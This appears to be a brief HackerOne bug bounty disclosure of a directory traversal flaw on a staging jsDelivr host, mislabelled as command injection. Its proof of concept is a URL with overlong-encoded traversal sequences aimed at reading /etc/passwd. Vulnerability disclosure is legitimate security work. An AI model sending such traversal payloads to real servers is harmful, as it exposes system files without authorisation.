# HackerOne Report: Directory Traversal at http://staging.jsdelivr.net/
**Report ID:** 18371
**Vulnerability Class:** Command Injection - Generic

## Vulnerability Information & PoC
hi, 

Directory Traversal is a vulnerability which allows attackers to access restricted directories and execute commands outside of the web server's root directory.

POC: go this link ->  

http://staging.jsdelivr.net//..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd



## Discussion & Remediation Timeline
